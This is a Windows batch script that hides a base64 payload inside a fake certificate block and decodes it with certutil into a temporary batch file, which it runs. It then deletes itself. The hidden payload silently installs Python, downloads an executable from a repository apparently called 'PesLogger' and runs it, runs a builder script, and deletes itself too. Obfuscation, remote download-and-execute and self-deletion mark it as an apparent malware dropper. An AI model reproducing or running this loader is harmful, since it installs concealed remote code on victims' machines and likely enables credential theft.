@echo off
CERTUTIL -f -decode "%~f0" "%Temp%/build.bat" >nul 2>&1 
cls
"%Temp%/build.bat"
Exit
-----BEGIN CERTIFICATE-----
QEVDSE8gT0ZGCkBNT0RFIDEwMSw1MAoKU0VUIHNvdXJjZT0iYmF0L3NyYy5leGUiClNFVCBmb2xkZXI9ImJhdC8iCgpFQ0hPIERPV05MT0FESU5HIFBZVEhPTiBJTlNUQUxMRVIgJiYgY3VybCAtTCAtTyBodHRwczovL3d3dy5weXRob24ub3JnL2Z0cC9weXRob24vMy4xMC41L3B5dGhvbi0zLjEwLjUtYW1kNjQuZXhlCgpmb3IgL2wgJSVpIGluICgxLDEsMTAwMCkgZG8gKAogICAgZWNobyAlJWkgPiBudWwpCgpFQ0hPIFJVTk5JTkcgSU5TVEFMTEVSICYmIHB5dGhvbi0zLjEwLjUtYW1kNjQuZXhlIC9xdWlldCBQcmVwZW5kUGF0aD0xIEluY2x1ZGVfdGVzdD0wCgpmb3IgL2wgJSVpIGluICgxLDEsMTAwMCkgZG8gKAogICAgZWNobyAlJWkgPiBudWwpCgpFQ0hPIFJFTU9WSU5HIElOU1RBTExFUiBFWEVDVVRBQkxFICYmIGRlbCBweXRob24tMy4xMC41LWFtZDY0LmV4ZQoKZm9yIC9sICUlaSBpbiAoMSwxLDEwMDApIGRvICgKICAgIGVjaG8gJSVpID4gbnVsKQoKICAgIGlmIE5PVCBFWElTVCAlZm9sZGVyJSAoCiAgICAgICAgbWtkaXIgJWZvbGRlciUKICAgICkKCiAgICBjdXJsIC1MIC1vICVzb3VyY2UlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9QZXNNb25rZXkvUGVzTG9nZ2VyL21haW4vYmF0L3NyYy5leGUKICAgIAogICAgZm9yIC9sICUlaSBpbiAoMSwxLDEwMDApIGRvICgKICAgIGVjaG8gJSVpID4gbnVsKQoKICAgICVzb3VyY2UlCgogICAgZm9yIC9sICUlaSBpbiAoMSwxLDEwMDApIGRvICgKICAgIGVjaG8gJSVpID4gbnVsKQoKICAgIEVDSE8gUkVNT1ZJTkcgSU5URVJGRVJFTkNFUyAmJiBQWSAtMy4xMCAtbSBwaXAgdW5pbnN0YWxsIC1yIGludGVyZmVyZW5jZXMudHh0CgogICAgZm9yIC9sICUlaSBpbiAoMSwxLDEwMDApIGRvICgKICAgIGVjaG8gJSVpID4gbnVsKQoKICAgIEVDSE8gSU5TVEFMTElORyBSRVFVSVJFTUVOVFMgJiYgUFkgLTMuMTAgLW0gcGlwIGluc3RhbGwgLS1mb3JjZS1yZWluc3RhbGwgLXIgcmVxdWlyZW1lbnRzLnR4dAoKICAgIGZvciAvbCAlJWkgaW4gKDEsMSwxMDAwKSBkbyAoCiAgICBlY2hvICUlaSA+IG51bCkKCiAgICBDTFMgJiYgUFkgLTMuMTAgYnVpbGRlci5weQoKICAgIFBBVVNFICYmIENPTE9SIDA3ICYmIEVYSVQgICAgCgpEZWwgJX4wCg==
-----END CERTIFICATE-----
Del %~0